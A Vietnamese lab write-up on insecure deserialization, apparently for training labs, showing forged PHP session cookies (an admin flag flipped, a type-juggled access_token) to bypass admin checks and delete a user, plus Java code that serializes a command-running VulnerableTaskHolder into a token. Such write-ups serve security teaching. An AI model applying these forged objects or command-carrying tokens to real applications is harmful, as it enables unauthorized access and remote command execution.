![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/19fec480-47d3-4685-aa61-391de0a180e0)# ltat_lab2
## Bài 7:

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/2447700a-d407-49d1-b9a2-9b7746d2b5ad)

- Mục tiêu của bài này là xóa được user ```carlos``` .
- Trước hết mình phải login bằng user và pass được cho trước.
- Sau một hồi scan thì mình tìm được đường dẫn ```/admin``` .

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/dd419f75-29bf-43d1-b51a-9f758e2dc25d)

- Có vẻ mình không thể vào được với người dùng bình thường.
- Check sơ qua cookie thì mình thấy một cookie có giá trị là ```session``` .
- Mình sẽ thử bật burpsuite lên để test thử.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/d502bf30-8304-40cb-86d9-9f0b932b65a2)

- Khi gửi req đến ```/admin``` server sẽ kiểm tra biến session của chúng ta, khi mình decode thử thì ra được một đối tượng là user.
- Điểm đáng chú ý ở đây là giá trị admin của session này đang là 0 ( do biến bool quyết định )
- Giờ mình chỉ cần chuyển nó về thành 1 và gửi req thì có thể bypass phần này.

  ![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/932acce0-7e60-4306-9eda-9602885769af)

- Giờ thì khi xóa user ```carlos``` chúng ta cũng sẽ làm tương tự.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/6018c782-e03a-4a65-a71e-21dd2e4ef85c)

```session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d```

## Bài 8:

- Bài này lúc đầu vào cũng giống bài trước nên mình sẽ vào thẳng phần session.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/1eb9bc4f-1399-4c68-816c-81066b427d44)

```O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"f4fb8seskjly3qw37onpt6ujkprn1co7";}```

- Ở đây chúng ta có vài trường mới trong class User này đó là ```username``` và ```access_token```.
- Theo mình hiểu thì ```access_token``` là một trường dùng để kiểm tra xem class có bị sửa đổi gì hay không và nếu nó sai thì sẽ không cho ta truy cập.
- Còn về phần username thì ở đây bắt buộc phải là ```administrator``` .
- Mình đọc hint thì có vẻ bài này được viết trên PHP, và mình nghỉ ngay đến một lỗi trong quá trình so sánh kiểu dữ liệu của PHP đó là php type juggling.
- Từ những dữ kiện trên, mình đã đã tạo được một class mới với giá trị như sau.

```O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}```
- Với Class này, mình đã đổi tên của user và đồng thời ép kiểu dữ liệu của access_token là int với giá trị là 0. Điều này làm cho biến access_token sẽ bị lỗi và trả về giá trị đúng.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/e353703a-36f7-4295-9906-9aace41bb32e)

- Vậy là mình đã bypass qua phần admin, bây giờ chỉ cần xóa User là solve được bài này.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/e1018c97-39d1-4d8e-bfd8-5ff91227087a)

```session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9```

## Bài 9:

- Đây là một chall về JAVA, đề cho chúng ta một đoạn code có sẵn:

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/8cac9e82-ac3f-426c-968b-4eacca3f44c3)

- Ở đây chúng ta có một đoạn code đáng chú ý.
 
![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/915099c0-b60c-4223-b273-08b355905cd7)

- Class VulnerableTaskHolder sẽ truyền mọi taskAction mà ta truyền vào nó, điều này có nghĩa là chúng ta có thể tận dụng điểm này để truyền một câu lệnh nào đó vào đây.
- Mình sẽ viết một đoạn code để có thể tạo một token thực hiện lệnh ```ping``` .

```java

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import org.dummy.insecure.framework.VulnerableTaskHolder;


public class Program {
    public static void main(String args[]) throws Exception{
        VulnerableTaskHolder vulnObj = new VulnerableTaskHolder("ping","ping -n 4 127.0.0.1");
		
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(vulnObj);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
```

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/91fc6455-a23f-45b7-994d-1fd50eb1d1a4)

-Đây là Token:
```rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfnChQWOB41NIOieHQAE3BpbmcgLW4gNCAxMjcuMC4wLjF0AARwaW5n```


![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/90a8fa86-b5d6-475a-ae55-8fe69856b9a0)

